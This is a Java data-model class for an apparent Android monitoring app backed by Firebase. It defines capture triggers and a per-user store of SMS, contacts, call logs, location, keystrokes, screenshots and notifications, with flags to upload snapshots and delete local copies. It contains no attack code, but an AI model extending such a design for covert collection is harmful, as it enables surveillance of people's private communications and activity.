package com.vikasyadavnsit.cdc.data;

import com.google.firebase.database.IgnoreExtraProperties;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.io.Serializable;
import java.util.Map;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

@IgnoreExtraProperties
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class User implements Serializable {
    private String id;
    private String fullName;

    private Map<String, Object> userDetails;
    private Map<String, Object> deviceDetails;
    private Map<String, Object> userSettings;
    private AppSettings appSettings;
    private UserDeviceData userDeviceData;

    @Data
    @Builder
    @NoArgsConstructor
    @AllArgsConstructor
    public static class AppSettings implements Serializable {
        private Map<String, AppTriggerSettingsData> appTriggerSettingsDataMap;
        private Map<String, Object> appSettingsMap;
    }

    @Data
    @Builder
    @NoArgsConstructor
    @AllArgsConstructor
    public static class AppTriggerSettingsData implements Serializable {
        private com.vikasyadavnsit.cdc.enums.TriggerType type;
        private boolean enabled;
        
        // --- Shared Fields ---
        private boolean permissionGranted;

        // --- Capture Configuration ---
        private boolean captureEnabled;
        private String captureMode; // REAL_TIME, SCHEDULED, MANUAL
        private String captureScheduleTime; // HH:mm
        private long lastCaptureTimestamp;

        // --- Action/Capture Fields ---
        private boolean repeatable;
        private int maxRepetitions;
        private long interval; // milliseconds
        private ActionStatus actionStatus;
        private ClickActions clickActions;
        private boolean uploadDataSnapshot;
        private boolean deleteLocalData;
        private boolean saveOnLocalFile;
        
        // --- Diagnostic Fields ---
        private String logLevels; // DEBUG,INFO,WARN,ERROR
        
        // --- Extensibility ---
        private Map<String, Object> extraConfig;
    }

    @Data
    @Builder
    @NoArgsConstructor
    @AllArgsConstructor
    public static class UserDeviceData implements Serializable {
        private Map<String, Object> sensors;
        private Map<String, Object> fileStructure;
        private Map<String, Object> sms;
        private Map<String, Object> contacts;
        private Map<String, Object> callLogs;
        private Map<String, Object> geolocation;
        private Map<String, Object> keystrokes;
        private Map<String, Object> deviceStats;
        private Map<String, Object> appStats;
        private Map<String, Object> screenshots;
        private Map<String, Object> offlineFiles;
        private Map<String, Object> notifications;

    }

}
